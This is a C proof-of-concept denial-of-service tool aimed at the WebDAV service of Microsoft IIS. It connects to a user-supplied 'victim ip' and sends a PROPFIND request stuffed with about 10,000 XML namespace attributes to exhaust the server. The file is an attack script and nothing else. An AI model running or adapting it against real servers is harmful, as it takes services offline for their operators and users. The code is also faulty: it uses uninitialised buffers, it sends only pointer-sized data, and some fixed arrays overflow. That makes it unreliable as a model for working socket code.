#ifdef HAVE_CONFIG_H
#include <config.h>
#endif

#include <stdio.h>
#include <iostream.h>
#include <stdlib.h>

#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>

usage();

int main(int argc, char *argv[])
{
/*  cout << "Hello, World!" << endl;*/

  struct sockaddr_in sin;
  int sck;
  char ip[15];
  char buf[18];

  char *xml_data, *xml_att, *request;
  int count = 0;
  unsigned long int length;
  int port = 80;
                                   
  if(argc != 3)
  {
    usage();  exit(0);
  }

  strcpy(ip, argv[1]);
  port = atoi(argv[2]);
  
  sck = socket(AF_INET, SOCK_STREAM, 0);
  if(sck == -1)
  {
    perror("Socket error ");  exit(0);
  }

  sin.sin_family = AF_INET;   
  sin.sin_port = htons(port);
  sin.sin_addr.s_addr = inet_addr(ip);
  

  if(connect(sck, (struct sockaddr *)&sin, sizeof(sin)) == -1)
  {
    perror("Connect error "); exit(0);
  } 

  // craft the evil!
  xml_att = malloc(sizeof(char) * 190000);
  xml_data = malloc(sizeof(char) * 200000);
  request = malloc(sizeof(char) * 210000);

  for(count = 1; count < 10000; count++)
  {
    sprintf(buf,"xmlns:z%d=\"xml:\" ",count);
    strcat(xml_att, buf);
  }

  sprintf(xml_data,"<?xml version=\"1.0\"?>\r\n<a:propfind xmlns:a=\"DAV:\" ");
  strcat(xml_data,xml_att);
  strcat(xml_data,">\r\n<a:prop><a:getcontenttype/></a:prop>\r\n</a:propfind>\r\n\r\n");
  
  length = strlen(xml_data);  
  sprintf(request,"PROPFIND / HTTP/1.1\nContent-type: text/xml\nHost: %s\nContent-length: %u\n\n%s\n\n",ip,length,xml_data); 

  send(sck,request,sizeof(request),0);
  puts("Evil Sent !, more than enough to say !");
  return EXIT_SUCCESS;
}


usage()
{
  puts("IIS WebDAV, Long XML DoS.");
  puts("Usage");
  puts("       IIS_WebDAV_DoS <victim ip> <port> ");
}
